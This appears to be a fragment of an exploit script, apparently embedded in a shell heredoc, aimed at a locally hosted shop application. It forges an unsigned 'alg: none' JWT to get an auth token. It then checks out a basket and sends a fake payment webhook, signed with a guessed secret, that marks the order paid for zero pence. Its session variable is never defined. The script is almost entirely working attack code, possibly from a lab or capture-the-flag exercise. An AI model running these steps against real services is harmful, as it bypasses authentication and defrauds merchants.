import hashlib,hmac,json,requests
base='http://127.0.0.1:52091'
unsigned='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOjF9.'
tok=requests.post(base+'/auth/refresh',json={'token':unsigned}).json()['token']

s.post(base+'/basket/items',json={'sku':'VASE-GLASS','qty':1})
o=s.post(base+'/basket/checkout').json(); print('checkout',o)
order=o['order_id']; sig=hmac.new(b'whsec-local',str(order).encode(),hashlib.sha256).hexdigest()
r=requests.post(base+'/webhooks/payments',headers={'X-Signature':sig},json={'order_id':order,'status':'paid','amount_pence':0})
print('webhook',r.status_code,r.text)
print('order',s.get(base+f'/orders/{order}').json())
PY"
